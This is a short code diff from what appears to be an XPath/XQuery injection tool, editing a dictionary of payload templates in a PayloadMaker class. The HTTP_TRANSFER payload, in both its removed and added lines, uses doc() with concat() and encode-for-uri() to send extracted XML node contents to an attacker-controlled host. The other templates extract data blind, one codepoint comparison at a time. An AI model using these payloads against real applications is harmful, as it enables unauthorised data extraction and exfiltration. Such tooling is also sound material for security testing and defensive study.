@@ -59,7 +59,7 @@ class PayloadMaker(object):
         "WRAP_LOWERCASE"       : WrapperPayload("lower-case($node)"),
         "WRAP_UNICODE"         : WrapperPayload("normalize-unicode($node)"),
         "STRING-TO-CODEPOINTS" : WrapperPayload("string-to-codepoints($node)"),
-        "HTTP_TRANSFER"        : WrapperPayload("doc(concat('http://$host/?id=$id%26q=',encode-for-uri($node)))", can_lower=True, normalization=True),
+        "HTTP_TRANSFER"        : WrapperPayload("boolean(doc(concat('http://$host/?id=$id-',encode-for-uri($node))))", can_lower=True, normalization=True),
 
         "GET_NODE_CODEPOINT"   : Payload("string-to-codepoints($node)[$index]=$count", can_lower=True, normalization=True),
         "GET_CODEPOINT_LENGTH" : Payload("(string-to-codepoints($node)[$index] > $min and string-to-codepoints($node)[$index] <= $max)", can_lower=True, normalization=True),
